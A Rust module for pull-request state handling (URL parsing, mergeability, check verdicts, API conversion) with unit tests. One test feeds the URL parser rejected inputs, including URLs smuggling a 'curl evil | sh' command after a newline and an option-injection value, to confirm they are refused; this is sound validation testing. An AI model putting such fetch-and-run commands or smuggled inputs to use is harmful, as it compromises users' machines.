use std::collections::HashMap;
use std::collections::hash_map::Entry;
use std::num::NonZeroU32;

use crate::v1;

pub const PULL_REQUESTS_MAX: usize = 2048;

const _: () = assert!(PULL_REQUESTS_MAX > 0);

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Mergeability {
    Mergeable,
    Conflicting,
    Unknown,
}

impl Mergeability {
    #[must_use]
    pub fn is_conflicting(self) -> bool {
        matches!(self, Mergeability::Conflicting)
    }

    #[must_use]
    pub fn to_api(self) -> v1::Mergeability {
        match self {
            Mergeability::Mergeable => v1::Mergeability::Mergeable,
            Mergeability::Conflicting => v1::Mergeability::Conflicting,
            Mergeability::Unknown => v1::Mergeability::Unknown,
        }
    }

    pub fn of_api(said: i32) -> Result<Option<Self>, String> {
        match v1::Mergeability::try_from(said) {
            Ok(v1::Mergeability::Unspecified) => Ok(None),
            Ok(v1::Mergeability::Mergeable) => Ok(Some(Mergeability::Mergeable)),
            Ok(v1::Mergeability::Conflicting) => Ok(Some(Mergeability::Conflicting)),
            Ok(v1::Mergeability::Unknown) => Ok(Some(Mergeability::Unknown)),
            Err(_) => Err(format!("unknown mergeability {said}")),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PullRequest {
    pub page: PullPage,
    pub state: State,
    pub stale: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PullPage {
    url: String,
    number: NonZeroU32,
}

const HTTPS: &str = "https://";

impl PullPage {
    pub fn parse(url: &str) -> Result<PullPage, String> {
        let path = url
            .strip_prefix(HTTPS)
            .ok_or_else(|| format!("{url} is no https page"))?;
        let parts: Vec<&str> = path.split('/').collect();
        let named = |part: &&str| !part.is_empty() && !part.contains(['?', '#']);
        let digits = |part: &str| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit());
        let number = match parts.as_slice() {
            [host, owner, name, "pull", pull]
                if [host, owner, name].into_iter().all(named) && digits(pull) =>
            {
                pull.parse().ok()
            }
            _ => None,
        };
        let number = number.ok_or_else(|| format!("{url} is no page of a pull request"))?;
        Ok(PullPage {
            url: url.to_owned(),
            number,
        })
    }

    #[must_use]
    pub fn url(&self) -> &str {
        &self.url
    }

    #[must_use]
    pub fn number(&self) -> NonZeroU32 {
        self.number
    }

    #[must_use]
    pub fn repository(&self) -> &str {
        let path = &self.url[HTTPS.len()..];
        path.rsplit_once("/pull/")
            .expect("a pull request's page holds /pull/")
            .0
    }

    #[must_use]
    pub fn host(&self) -> &str {
        self.repository()
            .split('/')
            .next()
            .expect("split yields at least once")
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct Checks {
    pub pending: u32,
    pub failed: u32,
    pub passed: u32,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Verdict {
    Failing,
    Pending,
    Passing,
}

impl Checks {
    #[must_use]
    pub fn verdict(&self) -> Option<Verdict> {
        match self {
            Checks { failed: 1.., .. } => Some(Verdict::Failing),
            Checks { pending: 1.., .. } => Some(Verdict::Pending),
            Checks { passed: 1.., .. } => Some(Verdict::Passing),
            Checks { .. } => None,
        }
    }

    fn to_api(self) -> v1::Checks {
        v1::Checks {
            pending: self.pending,
            failed: self.failed,
            passed: self.passed,
        }
    }

    fn of_api(checks: v1::Checks) -> Self {
        Checks {
            pending: checks.pending,
            failed: checks.failed,
            passed: checks.passed,
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum State {
    Open {
        draft: bool,
        checks: Option<Checks>,
        mergeability: Option<Mergeability>,
    },
    Merged,
    Closed,
}

impl PullRequest {
    #[must_use]
    pub fn number(&self) -> NonZeroU32 {
        self.page.number()
    }

    #[must_use]
    pub fn is_open(&self) -> bool {
        matches!(self.state, State::Open { .. })
    }

    #[must_use]
    pub fn is_merged(&self) -> bool {
        matches!(self.state, State::Merged)
    }

    #[must_use]
    pub fn verdict(&self) -> Option<Verdict> {
        match self.state {
            State::Open { checks, .. } => checks?.verdict(),
            State::Merged | State::Closed => None,
        }
    }

    #[must_use]
    pub fn mergeability(&self) -> Option<Mergeability> {
        match self.state {
            State::Open { mergeability, .. } => mergeability,
            State::Merged | State::Closed => None,
        }
    }

    #[must_use]
    pub fn has_conflicts(&self) -> bool {
        self.mergeability() == Some(Mergeability::Conflicting)
    }

    #[must_use]
    pub fn is_pending(&self) -> bool {
        self.verdict() == Some(Verdict::Pending)
            || self.mergeability() == Some(Mergeability::Unknown)
    }

    #[must_use]
    pub fn to_api(&self, dir: &str) -> v1::PullRequest {
        let (state, checks, detail) = match self.state {
            State::Open {
                draft,
                checks,
                mergeability,
            } => {
                let state = if draft {
                    v1::PullRequestState::Draft
                } else {
                    v1::PullRequestState::Open
                };
                let checks = checks.map(Checks::to_api);
                let mergeability =
                    mergeability.map_or(v1::Mergeability::Unspecified, Mergeability::to_api);
                let detail = v1::pull_request::Detail::Open(v1::pull_request::Open {
                    draft,
                    checks,
                    mergeability: mergeability.into(),
                });
                (state, checks, detail)
            }
            State::Merged => (
                v1::PullRequestState::Merged,
                None,
                v1::pull_request::Detail::Merged(()),
            ),
            State::Closed => (
                v1::PullRequestState::Closed,
                None,
                v1::pull_request::Detail::Closed(()),
            ),
        };
        v1::PullRequest {
            dir: dir.to_owned(),
            state: state.into(),
            url: self.page.url().to_owned(),
            checks,
            stale: self.stale,
            detail: Some(detail),
        }
    }

    #[must_use]
    pub fn of_api(pull_request: &v1::PullRequest) -> Option<Self> {
        let page = PullPage::parse(&pull_request.url).ok()?;
        let legacy_state = v1::PullRequestState::try_from(pull_request.state).ok()?;
        let state = match &pull_request.detail {
            Some(v1::pull_request::Detail::Open(open)) => {
                let expected = if open.draft {
                    v1::PullRequestState::Draft
                } else {
                    v1::PullRequestState::Open
                };
                if legacy_state != v1::PullRequestState::Unspecified && legacy_state != expected {
                    return None;
                }
                if pull_request.checks.is_some() && pull_request.checks != open.checks {
                    return None;
                }
                let mergeability = Mergeability::of_api(open.mergeability).ok()?;
                State::Open {
                    draft: open.draft,
                    checks: open.checks.map(Checks::of_api),
                    mergeability,
                }
            }
            Some(v1::pull_request::Detail::Merged(())) => {
                if legacy_state != v1::PullRequestState::Unspecified
                    && legacy_state != v1::PullRequestState::Merged
                {
                    return None;
                }
                if pull_request.checks.is_some() {
                    return None;
                }
                State::Merged
            }
            Some(v1::pull_request::Detail::Closed(())) => {
                if legacy_state != v1::PullRequestState::Unspecified
                    && legacy_state != v1::PullRequestState::Closed
                {
                    return None;
                }
                if pull_request.checks.is_some() {
                    return None;
                }
                State::Closed
            }
            None => match legacy_state {
                v1::PullRequestState::Unspecified => return None,
                v1::PullRequestState::Open => State::Open {
                    draft: false,
                    checks: pull_request.checks.map(Checks::of_api),
                    mergeability: None,
                },
                v1::PullRequestState::Draft => State::Open {
                    draft: true,
                    checks: pull_request.checks.map(Checks::of_api),
                    mergeability: None,
                },
                v1::PullRequestState::Merged => State::Merged,
                v1::PullRequestState::Closed => State::Closed,
            },
        };
        Some(PullRequest {
            page,
            state,
            stale: pull_request.stale,
        })
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct ParsedPullRequests<'a> {
    pub by_dir: HashMap<&'a str, PullRequest>,
    pub dropped_invalid: usize,
    pub dropped_duplicate: usize,
    pub truncated: usize,
}

impl<'a> ParsedPullRequests<'a> {
    #[must_use]
    pub fn of_api(pull_requests: &'a [v1::PullRequest]) -> Self {
        let mut parsed = Self {
            truncated: pull_requests.len().saturating_sub(PULL_REQUESTS_MAX),
            ..Self::default()
        };
        for pull in pull_requests.iter().take(PULL_REQUESTS_MAX) {
            if pull.dir.is_empty() {
                parsed.dropped_invalid += 1;
                continue;
            }
            let Some(read) = PullRequest::of_api(pull) else {
                parsed.dropped_invalid += 1;
                continue;
            };
            match parsed.by_dir.entry(pull.dir.as_str()) {
                Entry::Vacant(slot) => {
                    slot.insert(read);
                }
                Entry::Occupied(_) => parsed.dropped_duplicate += 1,
            }
        }
        parsed
    }

    #[must_use]
    pub fn anomalies(&self) -> Option<String> {
        let mut notes = Vec::new();
        if self.dropped_invalid > 0 {
            notes.push(format!("{} unreadable", self.dropped_invalid));
        }
        if self.dropped_duplicate > 0 {
            notes.push(format!("{} duplicate", self.dropped_duplicate));
        }
        if self.truncated > 0 {
            notes.push(format!(
                "{} past the {PULL_REQUESTS_MAX} limit",
                self.truncated
            ));
        }
        (!notes.is_empty()).then(|| format!("pull requests dropped: {}", notes.join(", ")))
    }
}

#[cfg(test)]
mod tests {
    use super::{
        Checks, Mergeability, PULL_REQUESTS_MAX, ParsedPullRequests, PullPage, PullRequest, State,
        Verdict, v1,
    };

    #[test]
    fn a_pull_request_reads_back_as_the_daemon_wrote_it() {
        let page = PullPage::parse("https://github.com/owner/repo/pull/126").unwrap();
        let checks = Some(Checks {
            pending: 1,
            failed: 2,
            passed: 3,
        });
        let none = Some(Checks::default());
        let open_states = [false, true].into_iter().flat_map(|draft| {
            [
                (checks, None),
                (None, Some(Mergeability::Mergeable)),
                (none, Some(Mergeability::Conflicting)),
                (checks, Some(Mergeability::Unknown)),
            ]
            .into_iter()
            .map(move |(checks, mergeability)| State::Open {
                draft,
                checks,
                mergeability,
            })
        });
        for state in open_states.chain([State::Merged, State::Closed]) {
            for stale in [false, true] {
                let pull_request = PullRequest {
                    page: page.clone(),
                    state,
                    stale,
                };
                let api = pull_request.to_api("/w/repo");
                assert_eq!(PullRequest::of_api(&api), Some(pull_request));
            }
        }

        for (legacy_state, expected) in [
            (
                v1::PullRequestState::Open,
                State::Open {
                    draft: false,
                    checks,
                    mergeability: None,
                },
            ),
            (
                v1::PullRequestState::Draft,
                State::Open {
                    draft: true,
                    checks,
                    mergeability: None,
                },
            ),
            (v1::PullRequestState::Merged, State::Merged),
            (v1::PullRequestState::Closed, State::Closed),
        ] {
            let legacy = v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: legacy_state.into(),
                url: page.url().to_owned(),
                checks: checks.map(Checks::to_api),
                stale: false,
                detail: None,
            };
            assert_eq!(
                PullRequest::of_api(&legacy),
                Some(PullRequest {
                    page: page.clone(),
                    state: expected,
                    stale: false,
                })
            );
        }

        let open = i32::from(v1::PullRequestState::Open);
        let merged = i32::from(v1::PullRequestState::Merged);
        let closed = i32::from(v1::PullRequestState::Closed);
        let unspecified = i32::from(v1::PullRequestState::Unspecified);
        let url = "https://github.com/owner/repo/pull/126";
        let detail_only = v1::PullRequest {
            dir: "/w/repo".to_owned(),
            state: unspecified,
            url: url.to_owned(),
            checks: None,
            stale: false,
            detail: Some(v1::pull_request::Detail::Open(v1::pull_request::Open {
                draft: false,
                checks: checks.map(Checks::to_api),
                mergeability: v1::Mergeability::Conflicting.into(),
            })),
        };
        assert_eq!(
            PullRequest::of_api(&detail_only),
            Some(PullRequest {
                page: page.clone(),
                state: State::Open {
                    draft: false,
                    checks,
                    mergeability: Some(Mergeability::Conflicting),
                },
                stale: false,
            })
        );
        let other_checks = Some(v1::Checks {
            pending: 0,
            failed: 0,
            passed: 1,
        });
        let unread = [
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: open,
                url: String::new(),
                checks: None,
                stale: false,
                detail: None,
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: open,
                url: "https://github.com/owner/repo/issues/126".to_owned(),
                checks: None,
                stale: false,
                detail: None,
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: unspecified,
                url: url.to_owned(),
                checks: None,
                stale: false,
                detail: None,
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: 99,
                url: url.to_owned(),
                checks: None,
                stale: false,
                detail: None,
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: open,
                url: url.to_owned(),
                checks: None,
                stale: false,
                detail: Some(v1::pull_request::Detail::Open(v1::pull_request::Open {
                    draft: false,
                    checks: None,
                    mergeability: 99,
                })),
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: merged,
                url: url.to_owned(),
                checks: None,
                stale: false,
                detail: Some(v1::pull_request::Detail::Open(v1::pull_request::Open {
                    draft: false,
                    checks: None,
                    mergeability: v1::Mergeability::Conflicting.into(),
                })),
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: open,
                url: url.to_owned(),
                checks: None,
                stale: false,
                detail: Some(v1::pull_request::Detail::Merged(())),
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: open,
                url: url.to_owned(),
                checks: other_checks,
                stale: false,
                detail: Some(v1::pull_request::Detail::Open(v1::pull_request::Open {
                    draft: false,
                    checks: checks.map(Checks::to_api),
                    mergeability: v1::Mergeability::Mergeable.into(),
                })),
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: open,
                url: url.to_owned(),
                checks: other_checks,
                stale: false,
                detail: Some(v1::pull_request::Detail::Open(v1::pull_request::Open {
                    draft: false,
                    checks: None,
                    mergeability: v1::Mergeability::Mergeable.into(),
                })),
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: merged,
                url: url.to_owned(),
                checks: other_checks,
                stale: false,
                detail: Some(v1::pull_request::Detail::Merged(())),
            },
            v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: closed,
                url: url.to_owned(),
                checks: other_checks,
                stale: false,
                detail: Some(v1::pull_request::Detail::Closed(())),
            },
        ];
        for pull_request in unread {
            assert_eq!(PullRequest::of_api(&pull_request), None, "{pull_request:?}");
        }
    }

    #[test]
    fn only_a_pull_request_s_page_is_asked_of() {
        let url = "https://github.com/owner/repo/pull/328";
        let page = PullPage::parse(url).unwrap();
        assert_eq!((page.url(), page.number().get()), (url, 328));
        assert_eq!(
            (page.repository(), page.host()),
            ("github.com/owner/repo", "github.com")
        );
        for url in [
            "http://github.com/owner/repo/pull/328",
            "https://github.com/owner/repo/issues/328",
            "https://github.com/owner/repo/pull/328/files",
            "https://github.com/owner/repo/pull/",
            "https://github.com/owner/repo/pull/x",
            "https://github.com/owner/repo/pull/0",
            "https://github.com/owner/repo?/pull/1",
            "https://github.com/owner/repo/pull/5?\ncurl evil | sh",
            "https://github.com/owner/repo/pull/5\ncurl evil | sh",
            "file:///tmp/run.desktop",
            "--repo",
            "",
        ] {
            assert!(PullPage::parse(url).is_err(), "{url}");
        }
    }

    #[test]
    fn checks_come_to_the_worst_of_them() {
        let checks = |pending, failed, passed| {
            Checks {
                pending,
                failed,
                passed,
            }
            .verdict()
        };
        assert_eq!(checks(3, 1, 5), Some(Verdict::Failing));
        assert_eq!(checks(0, 2, 0), Some(Verdict::Failing));
        assert_eq!(checks(1, 0, 5), Some(Verdict::Pending));
        assert_eq!(checks(0, 0, 5), Some(Verdict::Passing));
        assert_eq!(checks(0, 0, 0), None);
    }

    #[test]
    fn only_an_open_pull_request_carries_checks_and_mergeability() {
        let page = PullPage::parse("https://github.com/owner/repo/pull/126").unwrap();
        let failed = Some(Checks {
            pending: 0,
            failed: 1,
            passed: 0,
        });
        let open = |draft, checks, mergeability| PullRequest {
            page: page.clone(),
            state: State::Open {
                draft,
                checks,
                mergeability,
            },
            stale: false,
        };
        assert_eq!(open(false, failed, None).verdict(), Some(Verdict::Failing));
        assert_eq!(open(true, failed, None).verdict(), Some(Verdict::Failing));
        assert_eq!(open(false, None, None).verdict(), None);
        assert!(open(false, None, Some(Mergeability::Conflicting)).has_conflicts());
        assert!(open(true, None, Some(Mergeability::Conflicting)).has_conflicts());
        assert!(!open(false, None, Some(Mergeability::Mergeable)).has_conflicts());
        assert!(!open(false, None, Some(Mergeability::Unknown)).has_conflicts());
        assert!(open(false, None, Some(Mergeability::Unknown)).is_pending());
        assert!(!open(false, None, None).is_pending());

        for state in [State::Merged, State::Closed] {
            let inactive = PullRequest {
                page: page.clone(),
                state,
                stale: false,
            };
            assert_eq!(inactive.verdict(), None);
            assert_eq!(inactive.mergeability(), None);
            assert!(!inactive.has_conflicts());
            assert!(!inactive.is_pending());
        }
    }

    #[test]
    fn parsed_pull_requests_deduplicate_validate_and_bound() {
        let page = |n| PullPage::parse(&format!("https://github.com/o/r/pull/{n}")).unwrap();
        let open = |n, mergeability| PullRequest {
            page: page(n),
            state: State::Open {
                draft: false,
                checks: None,
                mergeability: Some(mergeability),
            },
            stale: false,
        };
        let first = open(1, Mergeability::Conflicting);
        let second = open(2, Mergeability::Mergeable);
        let invalid = v1::PullRequest {
            dir: "/w/bad".to_owned(),
            state: i32::from(v1::PullRequestState::Unspecified),
            url: page(3).url().to_owned(),
            checks: None,
            stale: false,
            detail: None,
        };
        let blank_dir = first.to_api("");
        let items = [
            first.to_api("/w/a"),
            second.to_api("/w/a"),
            invalid,
            blank_dir,
        ];
        let parsed = ParsedPullRequests::of_api(&items);
        assert_eq!(parsed.by_dir.get("/w/a"), Some(&first));
        assert_eq!(parsed.by_dir.len(), 1);
        assert_eq!(parsed.dropped_duplicate, 1);
        assert_eq!(parsed.dropped_invalid, 2);
        assert_eq!(parsed.truncated, 0);
        assert_eq!(
            parsed.anomalies().as_deref(),
            Some("pull requests dropped: 2 unreadable, 1 duplicate")
        );

        let many: Vec<v1::PullRequest> = (0..=PULL_REQUESTS_MAX)
            .map(|at| first.to_api(&format!("/w/{at}")))
            .collect();
        let bounded = ParsedPullRequests::of_api(&many);
        assert_eq!(bounded.by_dir.len(), PULL_REQUESTS_MAX);
        assert_eq!(bounded.truncated, 1);
        assert!(bounded.anomalies().is_some());
    }
}
